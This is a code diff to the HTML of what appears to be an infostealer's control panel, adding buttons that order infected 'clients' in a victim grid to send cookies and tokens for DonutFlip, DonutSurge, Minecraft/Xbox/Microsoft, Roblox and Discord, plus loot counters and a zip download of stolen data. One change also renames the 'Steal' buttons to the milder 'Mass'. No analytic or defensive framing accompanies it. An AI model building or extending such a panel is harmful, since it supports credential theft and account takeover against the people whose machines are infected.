@@ -160,33 +160,59 @@
           </span>
           DonutFlip
         </h2>
-        <p class="sub" id="donut-count">0 DonutPredict clients</p>
+        <p class="sub" id="donut-count">0 clients</p>
       </div>
-      <div class="row" style="gap:8px;align-items:center">
+      <div class="row" style="gap:8px;align-items:center;flex-wrap:wrap">
         <input id="donut-search" placeholder="filter…" oninput="refreshDonut()" style="max-width:180px"/>
         <button class="cmd sm" type="button" onclick="refreshDonut()">Refresh</button>
-        <button class="cmd sm" type="button" onclick="donutMass('donutflip')">Steal DF cookies</button>
-        <button class="cmd sm" type="button" onclick="donutMass('cookies')">Steal all cookies</button>
+        <button class="cmd sm" type="button" onclick="donutMass('donutflip')">Mass DF cookies</button>
+        <button class="cmd sm" type="button" onclick="donutMass('cookies')">Mass all cookies</button>
       </div>
     </div>
+
     <div class="victim-grid" id="donut-list"></div>
-    <div id="donut-detail" class="hidden" style="margin-top:16px">
-      <div class="card" style="padding:14px">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
-          <h3 id="donut-title">client</h3>
+
+    <div id="donut-detail" class="hidden" style="margin-top:14px">
+      <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px;margin-bottom:12px">
+        <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:12px;flex-wrap:wrap">
+          <div>
+            <button class="cmd sm" type="button" onclick="closeDonutDetail()">← back</button>
+            <h2 id="donut-title" style="margin:8px 0 4px">Donut client</h2>
+            <div class="muted" id="donut-sub" style="font-size:12px"></div>
+          </div>
           <div style="display:flex;gap:6px;flex-wrap:wrap">
-            <button class="cmd sm" onclick="donutCmd('donutflip')">DF cookies</button>
-            <button class="cmd sm" onclick="donutCmd('cookies')">All cookies</button>
-            <button class="cmd sm" onclick="donutCmd('hello')">Ping</button>
-            <button class="cmd sm danger" onclick="donutDelete()">Remove</button>
+            <span class="tag mild" id="df-loot-count">0 loot</span>
+            <span class="tag" id="df-session-tag">session ?</span>
+            <button class="cmd sm danger" type="button" onclick="donutDelete()">Remove</button>
           </div>
         </div>
-        <pre id="donut-meta" style="font-size:12px;opacity:.85;white-space:pre-wrap"></pre>
-        <h4 style="margin:12px 0 6px">Recent loot</h4>
-        <div id="donut-loot"></div>
+
+        <div style="font-weight:600;margin:14px 0 8px">Steal</div>
+        <div style="display:flex;flex-wrap:wrap;gap:8px">
+          <button class="cmd primary" type="button" onclick="donutCmd('donutflip')">DonutFlip cookies</button>
+          <button class="cmd" type="button" onclick="donutCmd('donutsurge')">DonutSurge cookies</button>
+          <button class="cmd" type="button" onclick="donutCmd('cookies')">All cookies</button>
+          <button class="cmd" type="button" onclick="donutCmd('minecraft')">Minecraft / Xbox / MSA</button>
+          <button class="cmd" type="button" onclick="donutCmd('microsoft')">Microsoft</button>
+          <button class="cmd" type="button" onclick="donutCmd('roblox')">Roblox</button>
+          <button class="cmd" type="button" onclick="donutCmd('discord')">Discord</button>
+          <button class="cmd" type="button" onclick="donutCmd('hello')">Ping / refresh</button>
+          <button class="cmd" type="button" onclick="openDonut(currentDonutEid)">Refresh loot</button>
+        </div>
+
+        <div style="margin-top:12px" class="muted" id="donut-meta" style="font-size:12px;white-space:pre-wrap"></div>
+      </div>
+
+      <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <div style="font-weight:600">Loot</div>
+          <a class="cmd sm" id="donut-zip-link" href="#">Download all zip</a>
+        </div>
+        <div id="donut-loot" class="steal-summary">no loot yet</div>
       </div>
     </div>
   </section>
+
 <section class="page" id="page-android">
     <div class="page-head">
       <div>
